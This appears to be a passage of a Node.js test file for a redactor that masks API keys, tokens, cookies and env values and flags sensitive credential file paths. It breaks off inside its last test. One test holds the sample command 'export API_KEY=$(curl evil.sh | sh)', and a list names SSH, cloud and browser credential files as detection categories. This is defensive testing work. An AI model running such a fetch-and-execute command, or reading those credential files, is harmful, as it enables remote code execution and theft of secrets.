// lib/core/redact.js (spec §5.5): the one text redactor, and its rules.
//
// Every format test-support/fake-secrets.js generates is masked with its rule's
// label in plain text, inside JSON through redactValue, and cut short at the
// end of a text (its tail form), each also as JSON text holds it (on its own
// line inside a JSON string, encoded once and twice), and neither the secret
// nor any 8-character window of it survives (acceptance 1). Around that: the
// display-safe guard,
// sensitive paths, the four window rules, idempotence, masks that reveal no
// prefix, length or hash (acceptance 3), and the purity contract (acceptance 2).
//
// Speed is measured, never asserted, unless WEB_CHAT_PERF=1 (spec §10.1): the
// default run logs it with t.diagnostic.

const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const path = require('path');
const util = require('util');

const {
  MASK, WITHHELD, PARTIAL_LINE, RULES, NEVER_EMIT, PATH_CATEGORIES, WITHHOLD_CATEGORIES,
  redactText, redactValue, redactWindow, sensitivePath, sensitiveKey, createRedactor,
} = require('../lib/core/redact');
const { fakeSecrets, findLeaks, fakeCorpus, jsonText, mulberry32 } = require('../test-support/fake-secrets');

const PERF = process.env.WEB_CHAT_PERF === '1';
const FAKES = fakeSecrets();
const RULE = new Map(RULES.map((r) => [r.id, r]));
const labelFor = (f) => f.known || RULE.get(f.rule).label;
const optsFor = (f) => ({ context: f.context, known: f.known ? [[f.secrets[0], f.known]] : undefined });
const jsonFor = (f) => (f.json !== undefined ? f.json : { tool: 'Bash', input: { notes: [f.text] }, result: { text: `out: ${f.text}` } });
const ms = (t0) => Number(process.hrtime.bigint() - t0) / 1e6;
// Each carrier as it stands, and as JSON text holds it: on its own line inside
// a JSON string, where a line break is `\n` and a quote `\"`, encoded once (a
// .jsonl line a command printed, an MCP result) and twice (that line inside
// another tool's JSON result). `o` is jsonText's options (a tail stays last).
const FORMS = [
  ['plain', (s) => s],
  ['JSON text', (s, o) => jsonText(s, o)],
  ['JSON in JSON', (s, o) => jsonText(s, { ...o, levels: 2 })],
];
// The formats that identify themselves, with no key or header beside them.
const TOKEN_RULES = new Set(['jwt', 'sk-key', 'github', 'aws-key-id', 'slack-token', 'google-api-key', 'google-client-secret',
  'google-oauth-token', 'npm', 'huggingface', 'stripe', 'cloudflare-tunnel']);

// The PEM marker and the mask's opening are spelled once, in lib/core/redact.js;
// a test builds them rather than writing them out.
const PEM = (edge, kind = 'RSA') => `-----${edge} ${kind ? `${kind} ` : ''}${['PRIVATE', 'KEY'].join(' ')}-----`;
const MASK_OPEN = MASK('x').slice(0, -'x›'.length);
const ANY_MASK = new RegExp(`${MASK_OPEN}[^›]*›`, 'g');
const ALL_LABELS = new Set([...RULES.map((r) => r.label), ...FAKES.filter((f) => f.known).map((f) => f.known)]);

function assertClean(out, f, { tail = false } = {}) {
  const leaks = findLeaks(out, [f], { tail });
  assert.deepEqual(leaks, [], `${f.id}: secret material survived\n${JSON.stringify(out).slice(0, 400)}`);
  assert.ok(out.includes(MASK(labelFor(f))), `${f.id}: no ${MASK(labelFor(f))} in\n${JSON.stringify(out).slice(0, 400)}`);
}

// ── the marks and the table ─────────────────────────────────────────────────

test('MASK and WITHHELD: fixed shapes, and a label is never text a caller passed through', () => {
  assert.equal(MASK('jwt'), `${MASK_OPEN}jwt›`);
  assert.equal(MASK('JWT'), MASK('jwt'), 'labels are lowercase');
  assert.equal(MASK('api-key'), `${MASK_OPEN}api-key›`);
  assert.equal(MASK('two words'), MASK('secret'), 'a label that is not a short word becomes "secret"');
  assert.equal(MASK('sk-ant-api03-' + 'x'.repeat(40)), MASK('secret'), 'a value passed as a label is not carried');
  assert.equal(MASK(undefined), MASK('secret'));
  assert.equal(WITHHELD('dotenv'), '‹withheld: sensitive file (dotenv)›');
  assert.equal(WITHHELD('../etc/passwd'), '‹withheld: sensitive file (other)›');
  assert.equal(PARTIAL_LINE, '‹partial line omitted›');
});

test('RULES: one frozen table, unique ids, the documented fields, tiers 1 and 2', () => {
  assert.ok(Object.isFrozen(RULES));
  const ids = RULES.map((r) => r.id);
  assert.equal(new Set(ids).size, ids.length, 'rule ids are unique');
  for (const r of RULES) {
    assert.ok(Object.isFrozen(r), `${r.id} is frozen`);
    assert.ok(Object.isFrozen(r.pre), `${r.id}.pre is frozen`);
    assert.ok([1, 2].includes(r.tier), `${r.id} has tier 1 or 2`);
    assert.match(r.label, /^[a-z][a-z0-9-]*$/, `${r.id} has a label`);
    assert.ok(r.re === null || r.re instanceof RegExp, `${r.id}.re is a RegExp or null`);
    if (r.re) assert.ok(r.re.global && !r.re.sticky, `${r.id} is a global, non-sticky regex`);
    assert.ok(typeof r.group === 'number' || Array.isArray(r.group), `${r.id} names its group`);
    for (const p of r.pre) assert.equal(p, p.toLowerCase(), `${r.id} prefilters on lowercase text`);
    if (r.tail) {
      assert.ok(r.tail.re instanceof RegExp && r.tail.re.global, `${r.id}.tail.re is a global regex`);
      assert.ok(!r.tail.re.multiline, `${r.id}'s tail anchors to the end of the TEXT, never of a line`);
    }
  }
  // The spec's tier 1 and tier 2 (§5.5), by id.
  const tier = (n) => RULES.filter((r) => r.tier === n).map((r) => r.id).sort();
  assert.deepEqual(tier(1), ['assign', 'bearer', 'cookie', 'env-dotenv', 'env-dump', 'env-line', 'json-key', 'jwt', 'known', 'messaging-token', 'pem', 'sk-key'].sort());
  for (const id of ['github', 'aws-key-id', 'aws-secret', 'slack-token', 'slack-webhook', 'google-api-key', 'google-client-secret',
    'npm', 'huggingface', 'stripe', 'cloudflare-tunnel', 'url-creds', 'curl-user', 'cli-flag', 'x-api-key']) {
    assert.equal(RULE.get(id)?.tier, 2, `${id} is a tier-2 rule`);
    assert.ok(RULE.get(id).tail, `${id} has a tail form`);
  }
  assert.ok(RULE.get('sk-key').tail, 'sk-key has a tail form');
  // The context-driven pair runs only under its mode; json-key only on keys.
  assert.equal(RULE.get('env-dotenv').mode, 'env-dotenv');
  assert.equal(RULE.get('env-dump').mode, 'env-dump');
  assert.equal(RULE.get('json-key').scope, 'key');
  // Specific before generic: the key=value forms run last.
  const order = RULES.map((r) => r.id);
  for (const id of ['jwt', 'sk-key', 'github', 'aws-secret', 'url-creds', 'bearer', 'cookie', 'cli-flag', 'env-line']) {
    assert.ok(order.indexOf(id) < order.indexOf('assign'), `${id} runs before assign`);
  }
  assert.ok(order.indexOf('cloudflare-tunnel') < order.indexOf('jwt'), 'the tunnel token is claimed before the jwt tail can');
});

test('fake-secrets: deterministic per seed, a fake for every rule, nothing shared between seeds', () => {
  assert.deepEqual(fakeSecrets(), FAKES, 'the same seed reproduces the same set');
  const other = fakeSecrets({ seed: 7 });
  assert.deepEqual(other.map((f) => f.id), FAKES.map((f) => f.id));
  const mine = new Set(FAKES.flatMap((f) => f.secrets));
  assert.equal(other.flatMap((f) => f.secrets).filter((s) => mine.has(s) && s.length >= 16).length, 0, 'another seed draws other values');
  assert.deepEqual([...new Set(FAKES.map((f) => f.rule))].sort(), RULES.map((r) => r.id).sort(), 'every rule has fakes, and every fake names a rule');
  for (const f of FAKES) {
    assert.ok(f.tail.text.endsWith(f.tail.secret) || f.tail.text.endsWith(`${f.tail.secret}…`), `${f.id}'s tail ends inside its secret`);
    assert.ok(f.tail.secret.length >= 4 && f.tail.secret.length < f.secrets[0].length + 1, `${f.id}'s tail is cut short`);
  }
});

// Every "nothing survives" assertion below rests on findLeaks; a helper that
// found nothing would make them all pass, so it is tested first.
test('findLeaks finds a whole secret, any 8 characters of one, and nothing shorter', () => {
  const ids = (leaks) => leaks.map((l) => l.id).sort();
  const all = FAKES.map((f) => f.id).sort();
  assert.deepEqual(ids(findLeaks(FAKES.map((f) => f.text).join('\n'), FAKES)), all, 'every unredacted carrier leaks');
  assert.deepEqual(ids(findLeaks(FAKES.map((f) => f.tail.text).join('\n'), FAKES, { tail: true })), all, 'every unredacted tail leaks');
  const f = FAKES.find((x) => x.id === 'github-ghp');
  const s = f.secrets[0];
  assert.deepEqual(findLeaks(`x ${s.slice(9, 17)} y`, [f]).map((l) => l.id), ['github-ghp'], 'an 8-character window is a leak');
  assert.deepEqual(findLeaks(`x ${s.slice(9, 16)} y`, [f]), [], 'seven characters are not');
  assert.deepEqual(findLeaks({ deep: [s.slice(20)] }, [f]).map((l) => l.id), ['github-ghp'], 'a value is serialised first');
});

// ── acceptance 1: nothing survives ──────────────────────────────────────────

test('text: every format, plain and as JSON text, is masked with its label and nothing of it survives', async (t) => {
  for (const f of FAKES) {
    for (const [form, wrap] of FORMS) {
      await t.test(`${f.id} (${form})`, () => assertClean(redactText(wrap(f.text), optsFor(f)), f));
    }
  }
});

test('JSON: every format through redactValue, structured and as JSON text in a value, as a deep copy that leaves its input alone', async (t) => {
  for (const f of FAKES) {
    const inputs = [['structured', jsonFor(f)],
      ...FORMS.slice(1).map(([form, wrap]) => [form, { type: 'tool_result', content: [{ type: 'text', text: wrap(f.text) }] }])];
    for (const [form, input] of inputs) {
      await t.test(`${f.id} (${form})`, () => {
        const before = JSON.stringify(input);
        const out = redactValue(input, optsFor(f));
        assert.equal(JSON.stringify(input), before, 'the input is not mutated');
        assert.notEqual(out, input);
        assertClean(JSON.stringify(out), f);
      });
    }
  }
});

test('tail form: every format cut short at the end of a text, plain and as JSON text, is masked whole', async (t) => {
  for (const f of FAKES) {
    for (const [form, wrap] of FORMS) {
      await t.test(`${f.id} (${form})`, () => assertClean(redactText(wrap(f.tail.text, { tail: true }), optsFor(f)), f, { tail: true }));
    }
  }
});

test('a token on its own line in JSON text, or right after any escape, is masked', () => {
  // The format alone, right after an escape whose last character belongs to its
  // alphabet: a JSON line break at each level, a tab, a \u escape, a
  // percent-encoded line break, and a terminal colour or cursor sequence
  // however ESC is spelled (raw, \u001b, \033, \x1b).
  const wraps = {
    'JSON text': (s) => jsonText(s),
    'JSON in JSON': (s) => jsonText(s, { levels: 2 }),
    'after \\t': (s) => JSON.stringify(`a\t${s}`),
    'after \\r\\n': (s) => JSON.stringify(`a\r\n${s}`),
    'after \\u0027': (s) => `x=\\u0027${s}\\u0027`,
    'after %0A': (s) => `a%0A${s}`,
    'after ESC[1;32m': (s) => `\x1b[1;32m${s}\x1b[0m`,
    'after \\u001b[32m': (s) => JSON.stringify(`\x1b[32m${s}\x1b[0m`),
    'after \\033[1m': (s) => `printf '\\033[1m${s}\\033[0m'`,
    'after \\x1b[K': (s) => `\\x1b[K${s}`,
  };
  const fakes = FAKES.filter((f) => TOKEN_RULES.has(f.rule));
  assert.ok(fakes.length >= 20);
  for (const f of fakes) {
    for (const [how, wrap] of Object.entries(wraps)) {
      const out = redactText(wrap(f.secrets[0]));
      assert.deepEqual(findLeaks(out, [f]), [], `${f.id} ${how}: ${out.slice(0, 120)}`);
      assert.ok(out.includes(MASK(labelFor(f))), `${f.id} ${how}: ${out.slice(0, 120)}`);
    }
  }
});

test('V16\'s case: a key on its own line of a prompt, in the transcript line a tool result carries', () => {
  const f = FAKES.find((x) => x.id === 'sk-openrouter');
  const record = JSON.stringify({ type: 'user', message: { role: 'user', content: `here is the key\n${f.secrets[0]}\nuse it` }, uuid: '0000-4000' });
  const out = createRedactor().value({ type: 'tool_result', tool_use_id: 'toolu_01', content: [{ type: 'text', text: `${record}\n${record}` }] });
  assert.deepEqual(findLeaks(out, [f]), []);
  assert.equal(JSON.stringify(out).split(MASK('api-key')).length - 1, 2);
});

test('headers, URLs, flags and env lines after a JSON line break, and keys in JSON in JSON, are masked', () => {
  const p = 'Zq81mXp2LwQ9abcdefgH';
  const S = MASK('secret');
  const cases = [
    [`x\nAuthorization: Basic ${Buffer.from(`svc:${p}`).toString('base64')}`, 'bearer'],
    [`x\nAuthorization: Bearer ${p}`, 'bearer'],
    [`x\nBearer ${p}`, 'bearer'],
    [`x\r\nSet-Cookie: sid=${p}; Path=/`, 'cookie'],
    [`x\ncurl -u u:${p} https://h.example.com`, 'curl-user'],
    [`x\nx-api-key: ${p}`, 'x-api-key'],
    [`x\n--token ${p}`, 'cli-flag'],
    [`x\nhttps://u:${p}@h.example.com`, 'url-creds'],
    [`x\nDB_PASSWORD=${p}\nNEXT=1`, 'env-line'],
    [`x\nSESSION_COOKIE_KEY=${p}`, 'env-line'],
    [`x\n     2\tSESSION_KEY=${p}`, 'env-line'],
  ].map(([text, id]) => [JSON.stringify(text), id]);
  // A key and its value in JSON three and four levels deep (`\\\"` and `\\\\\\\"`).
  cases.push([JSON.stringify(JSON.stringify(JSON.stringify({ password: p }))), 'assign']);
  cases.push([JSON.stringify(JSON.stringify(JSON.stringify(JSON.stringify({ input: { api_key: p } })))), 'assign']);
  for (const [text, id] of cases) {
    const ids = [];
    const out = redactText(text, { onMask: (n) => ids.push(n.id) });
    assert.ok(!out.includes(p.slice(0, 8)), `kept in ${out}`);
    assert.ok(ids.includes(id), `${id} masked ${text} (masked by ${ids})`);
  }
  // An env line ends with its JSON line and with its string: the next line,
  // and the next field, stay readable; a value in escaped quotes keeps them.
  const enc = (v) => JSON.stringify(v);
  assert.equal(redactText(enc({ a: `x\nSESSION_KEY=${p}\nNODE_ENV=production`, b: 'y z' })), enc({ a: `x\nSESSION_KEY=${S}\nNODE_ENV=production`, b: 'y z' }));
  assert.equal(redactText(enc({ a: `x\nSESSION_KEY=${p}`, b: 1 })), enc({ a: `x\nSESSION_KEY=${S}`, b: 1 }));
  assert.equal(redactText(enc({ a: `x\nSESSION_KEY="two words"\ny` })), enc({ a: `x\nSESSION_KEY="${S}"\ny` }));
  // An env value that ends where its string does is empty: nothing to mask.
  assert.equal(redactText(enc({ a: 'x\nSESSION_KEY=', b: 'y z' })), enc({ a: 'x\nSESSION_KEY=', b: 'y z' }));
});

test('a token after a percent-encoded byte, and an Azure account key, are masked', () => {
  const secret = (id) => FAKES.find((f) => f.id === id).secrets[0];
  const cases = [
    [`redirect_uri=https%3A%2F%2Fapp.example.com%2Fcb%3Ftoken%3D${secret('sk-anthropic-api')}&x=1`, 'sk-anthropic-api', 'api-key'],
    [`state%3D${secret('jwt-rs256')}`, 'jwt-rs256', 'jwt'],
    [`q%3D${secret('github-ghp')}%26page%3D2`, 'github-ghp', 'github-token'],
    [`key%3D${secret('aws-akia')}`, 'aws-akia', 'aws-key-id'],
    [`AccountName=acct;AccountKey=${secret('aws-secret')}==;EndpointSuffix=core.example.net`, 'aws-secret', 'secret'],
    // Base64 pads with `=` only at its end, so a tunnel token may follow one.
    [`CONNECTOR=${secret('cloudflare-tunnel')}`, 'cloudflare-tunnel', 'tunnel-token'],
    [`run --token=${secret('cloudflare-tunnel')}`, 'cloudflare-tunnel', 'tunnel-token'],
  ];
  for (const [text, id, label] of cases) {
    const out = redactText(text);
    assert.deepEqual(findLeaks(out, [FAKES.find((f) => f.id === id)]), [], `${id} in ${text.slice(0, 40)}…`);
    assert.ok(out.includes(MASK(label)), `${id}: ${out}`);
  }
});

test('a tail applies only at the end of a text: a short fragment mid-text is not a token', () => {
  for (const s of ['ghp_Ab3dE9 is too short to be a token', 'sk-Ab3dE9x and more', 'AKIAB12C then text']) {
    assert.equal(redactText(s), s);
  }
  assert.notEqual(redactText('the token was ghp_Ab3dE9xY…'), 'the token was ghp_Ab3dE9xY…', 'the same fragment at the end is masked');
});

test('json-key: credential-named keys mask their string values whole, 64-hex tokens included', () => {
  const hex = 'a3f9'.repeat(16);
  const seen = [];
  const out = redactValue({
    store: { token: hex, save_endpoint: '/api/save', url: 'http://localhost:5173' },
    list: [{ api_key: 'k'.repeat(12) + '12' }, { 'X-API-Key': 'abcdefgh1234' }],
    headers: { authorization: 'Bearer abc', Cookie: 'sid=1', 'set-cookie': ['a=b; Path=/', 'c=d'] },
    camel: { refreshToken: 'r1', clientSecret: 's1', dbPassword: 'p1', privateKey: 'q1', credentials: 'c1' },
    not: { session_id: 'b6a2c3d4-0000-4000-8000-123456789abc', max_tokens: '4096', tokenizer: 'cl100k', tokens: ['t'], secretCount: 2, has_password: true },
    empty: { token: '' },
  }, { onMask: (n) => seen.push(n.id) });
  const S = MASK(RULE.get('json-key').label);
  assert.equal(out.store.token, S, 'a token-named 64-hex value is masked (V16: 578 of them)');
  assert.equal(out.store.save_endpoint, '/api/save');
  assert.equal(out.list[0].api_key, S);
  assert.equal(out.list[1]['X-API-Key'], S);
  assert.equal(out.headers.authorization, S);
  assert.equal(out.headers.Cookie, S);
  assert.deepEqual(out.headers['set-cookie'], [S, S], 'an array of strings under a credential key is masked string by string');
  assert.deepEqual(Object.values(out.camel), [S, S, S, S, S], 'camelCase spellings are the same keys');
  assert.deepEqual(out.not, { session_id: 'b6a2c3d4-0000-4000-8000-123456789abc', max_tokens: '4096', tokenizer: 'cl100k', tokens: ['t'], secretCount: 2, has_password: true },
    'session ids, token counts and booleans are not credentials');
  assert.equal(out.empty.token, '', 'an empty value has nothing to mask');
  assert.ok(seen.filter((id) => id === 'json-key').length >= 12);
  assert.deepEqual(sensitiveKey('x-session-token'), true);
  assert.deepEqual(['session_id', 'max_tokens', 'tokenizer', 'apiKeySource', 'tool_use_id'].map(sensitiveKey), [false, false, false, false, false]);
});

test('redactValue: shared references and cycles, an own __proto__ key, non-plain objects, secret keys', () => {
  const shared = { password: 'hunter2andmore' };
  const cyclic = { name: 'loop', both: [shared, shared] };
  cyclic.self = cyclic;
  const out = redactValue(cyclic);
  assert.equal(out.self, out, 'a cycle is copied as a cycle');
  assert.equal(out.both[0], out.both[1], 'a shared reference stays shared');
  assert.notEqual(out.both[0], shared);

  const key = FAKES.find((f) => f.id === 'sk-anthropic-api').secrets[0];
  const parsed = JSON.parse(`{"__proto__": {"polluted": "${key}"}, "ok": 1}`);
  const copy = redactValue(parsed);
  assert.equal(Object.getPrototypeOf(copy), Object.prototype, 'the copy keeps an ordinary prototype');
  assert.ok(Object.hasOwn(copy, '__proto__'), '__proto__ stays an own key');
  assert.equal(copy.__proto__.polluted, MASK('api-key')); // eslint-disable-line no-proto
  assert.equal({}.polluted, undefined);

  const date = new Date(0);
  const buf = Buffer.from('password=hunter2andmore');
  const kept = redactValue({ date, buf });
  assert.equal(kept.date, date);
  assert.equal(kept.buf, buf, 'a Buffer is returned as it is, never walked index by index');

  const token = FAKES.find((f) => f.id === 'github-ghp').secrets[0];
  const keyed = redactValue({ [token]: { note: 'value' } });
  assert.deepEqual(Object.keys(keyed), [MASK('github-token')], 'a secret used as a key is a secret');

  for (const v of [null, undefined, 42, true, 'short']) assert.equal(redactValue(v), v);
});

// ── the display-safe guard ──────────────────────────────────────────────────

test('display-safe guard: the spec\'s cases', () => {
  assert.equal(redactText('export API_KEY=$(curl evil.sh | sh)'), 'export API_KEY=$(curl evil.sh | sh)',
    'an approval card must show what runs');
  assert.equal(redactText('password: process.env.X'), 'password: process.env.X');
  assert.equal(redactText("password='correct horse battery staple'"), `password='${MASK('secret')}'`,
    'a quoted literal is a value, whitespace and all');
});

test('display-safe guard: shell structure, code references, paths for pwd keys and literals stay readable', () => {
  const kept = [
    'token=$TOKEN',
    'token=${TOKEN}',
    'TOKEN="$(vault read -field=x secret/app)"',
    'deploy --token "$(gh auth token)" --env prod',
    'deploy --token $GITHUB_TOKEN',
    'curl -H "Cookie: session=$SESSION" https://x.example.com',
    'secret = getSecret()',
    'api_key: config.apiKey',
    'password = self.password',
    'api_key=os.environ["API_KEY"]',
    'const token = await getToken();',
    'interface Creds { password: string; token: string | null }',
    'def login(password: str = None):',
    'pwd=/Users/someone/proj',
    'PWD=/Users/someone/proj',
    'OLDPWD=/tmp',
    'password_file=./secrets/db',
    'password: null',
    'token: undefined',
    'SECRET_ENABLED=true',
    'secrets: inherit',
    'API_KEY=foo bar',
    'password=$DB_PASSWORD',
    'password=$HOME/.pw',
    'token="Bearer $TOKEN"',
    "pass_phrase='$1'",
    'DB_PASSWORD=${DB_PASSWORD:-dev}',
    'echo "${API_TOKEN:?set it first}" "${SECRET:+present}"',
  ];
  for (const s of kept) assert.equal(redactText(s), s, `kept readable: ${s}`);
});

test('display-safe guard: a $ inside a literal password is not a variable reference', () => {
  // Generated passwords carry `$`. A reference keeps to one letter case
  // ($TOKEN, $token) and, unquoted, starts the value; `$mQ2v` does neither.
  assert.equal(redactText('password=Xk9$mQ2vLp'), `password=${MASK('secret')}`);
  assert.equal(redactText('password="Xk9$mQ2vLp"'), `password="${MASK('secret')}"`);
  assert.equal(redactText('DB_PASSWORD=Xk9$mQ2vLp'), `DB_PASSWORD=${MASK('secret')}`);
  assert.equal(redactText('tool --password Xk9$mQ2vLp'), `tool --password ${MASK('secret')}`);
});

test('display-safe guard: each of assign, env-line, cli-flag and cookie keeps code and masks a literal', () => {
  const cases = {
    assign: ['client_secret: $CLIENT_SECRET', 'client_secret: Zq81mXp2Lw'],
    'env-line': ['WEBHOOK_SECRET=$(cat /run/secret)', 'WEBHOOK_SECRET=Zq81mXp2Lw'],
    'cli-flag': ['tool --auth-token "$(op read x)"', 'tool --auth-token Zq81mXp2Lw'],
    cookie: ['Cookie: sid=$SID', 'Cookie: sid=Zq81mXp2Lw'],
  };
  for (const [id, [code, literal]] of Object.entries(cases)) {
    const ids = [];
    assert.equal(redactText(code), code, `${id} keeps ${code}`);
    const out = redactText(literal, { onMask: (n) => ids.push(n.id) });
    assert.ok(!out.includes('Zq81mXp2Lw') && ids.includes(id), `${id} masks ${literal} (masked by ${ids})`);
  }
});

test('sk-key and slack-token leave identifier-shaped strings alone (secret_scan.py\'s is_identifier_like)', () => {
  for (const s of ['the sk-some-long-identifier-name-here class', 'xoxb-not-a-real-token-for-tests', 'sk-aaaaaaaaaaaaaaaaaaaaaaaaaaaa']) {
    assert.equal(redactText(s), s);
  }
  assert.notEqual(redactText('sk-proj-Q7wErTy9uIoP2aSdF4gHjK6lZxCv'), 'sk-proj-Q7wErTy9uIoP2aSdF4gHjK6lZxCv');
});

test('what is not a secret stays readable: code, ids, hashes, ports and prose', () => {
  const kept = [
    'the max_tokens: 4096 limit',
    'tokenizer = AutoTokenizer.from_pretrained(name)',
    '{"session_id":"8a1f2c3d-4e5f-6789-abcd-ef0123456789","tool_use_id":"toolu_01ABC"}',
    'commit 3f2a9c1b8e7d6f5a4b3c2d1e0f9a8b7c6d5e4f3a',
    'open http://localhost:5173',
    'server at http://127.0.0.1:8080',
    'see https://example.com:8443/path',
    'Bearer tokens are described in RFC 6750',
    'Authorization: required for every call',
    'the task-output-file and sk-learn-the-basics-tutorial',
    'npm_config_cache and hf_hub_download',
    'if token == null: return',
    'tokens: 12, passed: 3',
    'SECRET_KEY_BASE=${SECRET_KEY_BASE}',
    'docker run -u 1000:1000 image',
    'git config credential.helper osxkeychain',
    'NODE_ENV=production\nPORT=8080',
    'see lib/core/redact.js:120 and docs/extending.md',
  ];
  for (const s of kept) assert.equal(redactText(s), s, `kept: ${s}`);
});

// ── context hooks (the modes spec §5.5's context paragraph selects) ─────────

test('context: env-dotenv masks every value and keeps keys; env-dump masks credential names, unguarded', () => {
  const dotenv = '# app\nPORT=8080\nexport NAME="two words"\nEMPTY=\nURL=postgres://db.example.org/app';
  const d = redactText(dotenv, { context: { mode: 'env-dotenv' } });
  const V = MASK('env-value');
  assert.equal(d, `# app\nPORT=${V}\nexport NAME="${V}"\nEMPTY=\nURL=${V}`);
  assert.equal(redactText(dotenv), dotenv, 'without the mode a dotenv\'s ordinary values are not credentials');

  const dump = 'HOME=/home/someone\ndeclare -x AUTH_PHRASE="a b c"\nGITHUB_TOKEN=Zq81mXp2Lw\nPWD=/home/someone/app\nLANG=C';
  assert.equal(redactText(dump, { context: { mode: 'env-dump' } }),
    `HOME=/home/someone\ndeclare -x AUTH_PHRASE="${V}"\nGITHUB_TOKEN=${V}\nPWD=/home/someone/app\nLANG=C`,
    'a dump\'s values are literal: a value with spaces is masked, a path for PWD is not');
  assert.equal(redactText('AUTH_PHRASE=a b c'), 'AUTH_PHRASE=a b c', 'outside a dump, unquoted whitespace is shell structure');
  assert.equal(redactText(dump, { context: { mode: 'something-else' } }), redactText(dump), 'an unknown mode drives nothing');
});

test('env rows: which part of a line is the value', () => {
  const S = MASK('secret');
  const V = MASK('env-value');
  const p = 'Zq81mXp2Lw';
  // env-line: a comment is not the value, the command a quoted assignment
  // prefixes is shell and stays, and a CRLF line keeps its CR.
  assert.equal(redactText(`API_TOKEN=${p} # rotated monthly`), `API_TOKEN=${S} # rotated monthly`);
  assert.equal(redactText(`SESSION_COOKIE_KEY="${p}" ./serve --port 80`), `SESSION_COOKIE_KEY="${S}" ./serve --port 80`);
  assert.equal(redactText(`SESSION_COOKIE_KEY='${p}' ./serve`), `SESSION_COOKIE_KEY='${S}' ./serve`);
  assert.equal(redactText(`API_TOKEN=${p}\r\nNEXT=1`), `API_TOKEN=${S}\r\nNEXT=1`);
  assert.equal(redactText(`API_TOKEN="${p}`), `API_TOKEN="${S}`, 'a quote left open runs to the end of the line');
  assert.equal(redactText(`API_TOKEN='${p}`), `API_TOKEN=${S}`, 'an open single quote is part of an unquoted value');
  assert.equal(redactText(`API_TOKEN=${p}    `), `API_TOKEN=${S}    `, 'trailing blanks are not the value');
  assert.equal(redactText(`SESSION_KEY=ab"${p}"`), `SESSION_KEY=${S}"`, 'a quote inside a shell word does not end the value');
  assert.equal(redactText(`SESSION_KEY=${p}"; next`), `SESSION_KEY=${S}"; next`, 'a quote before a delimiter does');
  // env-dotenv: a comment after a closing quote is kept; anything else after
  // it, and an unquoted value's comment, are part of the value.
  const dotenv = { context: { mode: 'env-dotenv' } };
  assert.equal(redactText(`NAME="${p}" # note`, dotenv), `NAME="${V}" # note`);
  assert.equal(redactText(`NAME="${p}"tail`, dotenv), `NAME=${V}`);
  assert.equal(redactText(`NAME=${p} # note`, dotenv), `NAME=${V}`);
  assert.equal(redactText(`NAME = ${p}`, dotenv), `NAME = ${V}`);
  // env-dump: a dump's values are literal, so only blanks may follow a quote.
  const dump = { context: { mode: 'env-dump' } };
  assert.equal(redactText(`declare -x VAULT_TOKEN="${p}"`, dump), `declare -x VAULT_TOKEN="${V}"`);
  assert.equal(redactText(`VAULT_TOKEN="${p}" #x`, dump), `VAULT_TOKEN=${V}`);
  assert.equal(redactText(`vault_token=${p} #x`, dump), `vault_token=${V}`);
  // A name is at most 128 characters, its family word starting in the first
  // 125 (SESSION is a family word only env-line knows; assign would take TOKEN).
  assert.equal(redactText(`${'A'.repeat(100)}_SESSION=${p}`), `${'A'.repeat(100)}_SESSION=${S}`);
  assert.equal(redactText(`${'A'.repeat(140)}_SESSION=${p}`), `${'A'.repeat(140)}_SESSION=${p}`);
});

// ── sensitive paths ─────────────────────────────────────────────────────────

test('sensitivePath: every category, case-insensitively on every platform', () => {
  const cases = {
    dotenv: ['.env', 'proj/.env.local', '/srv/app/.ENV', 'prod.env', 'C:\\Users\\me\\app\\.Env.Production', '.envrc', '.dev.vars'],
    ssh: ['/Users/me/.ssh/config', '~/.SSH/known_hosts', 'ID_RSA', 'keys/id_ed25519.pub', 'id_ecdsa_sk', 'id_dsa', 'authorized_keys', 'known_hosts'],
    key: ['server.pem', 'TLS.KEY', 'cert.p12', 'a.pfx', 'AuthKey.p8', 'release.jks', 'app.keystore', 'putty.ppk'],
    cloud: ['/home/me/.aws/credentials', '~/.AWS/config', '~/.config/gcloud/configurations/config_default', 'application_default_credentials.json',
      'service-account-prod.json', 'Service_Account.JSON', '~/.kube/config', '~/.docker/config.json', '~/.azure/accessTokens.json'],
    pkg: ['~/.npmrc', '.pypirc', '.netrc', '.git-credentials', '.yarnrc', '.yarnrc.yml', '~/.gem/credentials', '~/.cargo/credentials', '~/.cargo/credentials.toml'],
    claude: ['~/.claude/.credentials.json', '/Users/me/.claude.json', 'proj/.claude/settings.local.json', '~/.claude/sessions/4242.json', '~/.CLAUDE/Sessions'],
    'web-chat': ['proj/.web-chat/graph/n1.json', '~/.web-chat/tunnel/tunnel.json', '.WEB-CHAT/server.json'],
    history: ['~/.zsh_history', '.bash_history', '.python_history', '.node_repl_history'],
    credentials: ['Credentials.json', 'secrets.yaml', 'client_secret.json', 'app.secret', 'db-credentials.txt', 'SECRETS'],
    browser: ['~/Library/Application Support/Google/Chrome/Default/Cookies', 'cookies.sqlite', 'Cookies.binarycookies', '/Users/me/Library/Keychains/login.keychain-db'],
    git: ['proj/.git/config', '.git/HEAD', 'repo/.GIT/hooks/pre-commit'],
  };
  assert.deepEqual(Object.keys(cases).sort(), [...PATH_CATEGORIES].sort(), 'every category is covered here');
  for (const [cat, paths] of Object.entries(cases)) {
    for (const p of paths) assert.equal(sensitivePath(p), cat, `${p} is ${cat}`);
  }
});

test('sensitivePath: a dotenv template is not a dotenv; withheld categories win over web-chat and git', () => {
  for (const p of ['.env.example', '.env.sample', '.env.template', '.env.dist', '.env.default', '.env.defaults', '.ENV.EXAMPLE', 'proj/.env.local.sample']) {
    assert.equal(sensitivePath(p), null, `${p} is a template`);
  }
  assert.equal(sensitivePath('.env.example.local'), 'dotenv', 'only the last suffix decides');
  assert.equal(sensitivePath('proj/.git/deploy.pem'), 'key', 'a key inside .git/ is still a key');
  assert.equal(sensitivePath('proj/.web-chat/secrets.json'), 'credentials');
  // The spec's order decides between two withheld categories: a session's peer
  // token file is a key file before it is Claude Code state.
  assert.equal(sensitivePath('~/.claude/sessions/4242.key'), 'key');
});

test('sensitivePath: source code about secrets, and ordinary paths, are not sensitive', () => {
  for (const p of ['lib/core/redact.js', 'design/chat-mirror-validation/secret_scan.py', 'test-support/fake-secrets.js', 'docs/secrets.md',
    'README.md', 'src/keyboard.ts', '.github/workflows/test.yml', '.gitignore', 'proj/.env/bin/python', '', '/']) {
    assert.equal(sensitivePath(p), null, `${p} is not sensitive`);
  }
  for (const v of [null, undefined, 42, {}]) assert.equal(sensitivePath(v), null);
});

test('WITHHOLD_CATEGORIES is every category except web-chat and git', () => {
  assert.deepEqual([...WITHHOLD_CATEGORIES].sort(), PATH_CATEGORIES.filter((c) => c !== 'web-chat' && c !== 'git').sort());
